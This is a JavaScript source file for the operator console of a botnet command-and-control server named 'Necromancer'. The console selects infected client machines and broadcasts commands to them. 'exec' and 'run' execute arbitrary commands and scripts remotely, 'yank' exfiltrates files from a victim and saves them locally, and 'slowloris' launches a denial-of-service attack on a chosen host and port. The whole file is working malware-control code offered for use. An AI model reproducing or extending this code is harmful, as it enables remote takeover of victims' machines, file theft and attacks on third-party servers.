import readline from "readline";
import * as fs from "fs";
import { clientModules, broadcast } from "./server.js";

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

let fileNum = 0;

export function prompt() {
	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
		message = message.toLowerCase();

		const args = {
			first: message.split(" ")[1],
			second: message.split(" ")[2],
			third: message.split(" ")[3],
			fourth: message.split(" ")[4],
		};

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(
					`Instances: ${clientModules.clientInstances.length}`
				);
			} else if (args.first <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances =
					clientModules.clientInstances.slice(0, args.first);
			}
		}

		if (args.first === "all")
			clientModules.clientInstances = [...clientModules.clients];

		if (message.startsWith("select")) {
			clientModules.clientInstances = Array(
				clientModules.clientInstances[args.first]
			).filter((i) => i !== undefined);
		}

		if (message.startsWith("silent")) {
			if (message === "silent")
				console.log(`silent: ${clientModules.silent}`);
			else if (args.first === "true") {
				clientModules.silent = true;
			} else {
				clientModules.silent = false;
			}
		}

		if (message.startsWith("logging")) {
			if (message === "logging")
				console.log(`logging: ${clientModules.logging}`);
			else if (args.first === "true") {
				clientModules.logging = true;
				clientModules.silent = true;
			} else {
				clientModules.logging = false;
				clientModules.silent = false;
			}
		}

		if (message === "clear") console.clear();

		if (message.startsWith("yank")) {
			if (!clientModules.logging) {
				console.log("Please enable logging to use this feature");
				return prompt();
			}
			if (message === "yank")
				console.log("Please provide arugments: yank (file name)");
			else if (clientModules.clientInstances.length > 1) {
				console.log(
					"You can only use this command on one machine at a time"
				);
				return prompt();
			} else if (args.first !== undefined) {
				if (clientModules.logging) {
					fileNum++;
					broadcast(message);
				}
			}
		}

		if (message === "scripts") {
			listScripts();
		}

		if (message.startsWith("run")) {
			runScript(args.first);
		}

		if (message.startsWith("slowloris")) {
			if (message === "slowloris")
				console.log(
					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
				);
			else if (args.first !== undefined) {
				broadcast(message);
				console.log(`Attack sent!`);
			}
		}

		if (message.startsWith("exec")) broadcast(message);

		return prompt();
	});
}

const scriptsDir = "../../config/scripts";

function listScripts() {
	fs.readdir(scriptsDir, (err, files) => {
		console.log("\nList of scripts in script dir:");
		files.forEach((file) => {
			if (file.includes(".cmd")) console.log(`\x1b[34m${file}\x1b[0m`);
		});
		prompt();
	});
}

function runScript(scriptName) {
	fs.readdir(scriptsDir, (err, files) => {
		files.forEach((file) => {
			if (file === scriptName) {
				fs.readFile(
					`${scriptsDir}/${scriptName}`,
					"utf8",
					(err, data) => {
						console.log("\x1b[91mRunning script...\x1b[0m");
						broadcast(`exec ${data}`);
					}
				);
			}
		});
		prompt();
	});
}

export function saveFile(chunk) {
	let timer;
	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
	let tempChunk = chunk;

	writeStream.write(chunk);
	if (tempChunk === chunk) clearTimeout(timer);

	timer = setTimeout(() => {
		writeStream.end();
	}, 3000);
}
